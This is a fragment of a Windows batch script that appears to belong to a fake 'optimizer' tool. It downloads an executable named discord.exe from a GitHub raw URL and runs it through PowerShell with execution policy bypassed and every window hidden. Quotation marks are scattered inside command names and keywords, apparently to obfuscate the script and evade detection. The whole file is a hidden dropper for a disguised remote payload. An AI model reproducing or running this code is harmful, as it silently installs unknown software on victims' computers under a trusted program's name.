...
:: Set the direct URL and filename
set "Url=https://github.com/GoldHourse/OPTI"M"IZER/r"a"w/main/dis"c"ord.exe"
set "Filename=discord.exe"

:: Use PowerShell to download the file and execute it completely hidden
powershell -NoProf"i"le -Executio"n"Policy B"y"pass -Window"S"tyle Hidden -Co"m"mand ^
    "Inv"o"ke-W"e"bRequest -Uri '%Url%' -Ou"t"File '%Filename%';" ^
    "Start-Process -FilePath '%Filename%' -Window"S"tyle Hidd"e"n"
